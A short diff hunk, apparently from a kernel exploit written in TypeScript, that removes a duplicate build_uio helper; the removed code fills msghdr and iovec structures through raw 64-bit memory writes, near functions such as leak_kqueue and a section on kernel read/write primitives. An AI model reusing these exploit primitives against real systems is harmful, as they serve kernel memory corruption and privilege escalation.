@@ -1601,47 +1601,6 @@ function leak_kqueue (): boolean {
   *   uio/KR/KW
   * ===========================
   */
-
-function build_uio(
-  uio_iov: BigInt,
-  offset: number,
-  read: boolean,
-  addr: BigInt,
-  size: number
-): void {
-
-  log('[UIO] build_uio called')
-  log(`[UIO] addr=${addr} size=${size} offset=${offset}`)
-
-  // msg_iov[0].iov_base = addr
-  write64(msgIov.add(0x00), addr)
-  // msg_iov[0].iov_len = size
-  write64(msgIov.add(0x08), size)
-
-  // msg_iov[1].iov_base = uio_iov + offset
-  write64(msgIov.add(0x10), uio_iov.add(offset))
-  // msg_iov[1].iov_len = size
-  write64(msgIov.add(0x18), size)
-
-  // msg_iov pointer + length
-  write64(msg.add(0x10), msgIov)
-  write64(msg.add(0x18), 2)
-
-  // msg_name = NULL
-  write64(msg.add(0x00), 0n)
-  write32(msg.add(0x08), 0)
-
-  // msg_control = NULL
-  write64(msg.add(0x20), 0n)
-  write64(msg.add(0x28), 0)
-
-  // msg_flags = 0
-  write32(msg.add(0x2C), 0)
-
-  log('[UIO] build_uio done')
-}
-
-
 function build_uio(
   uio: BigInt,
   uio_iov: BigInt,
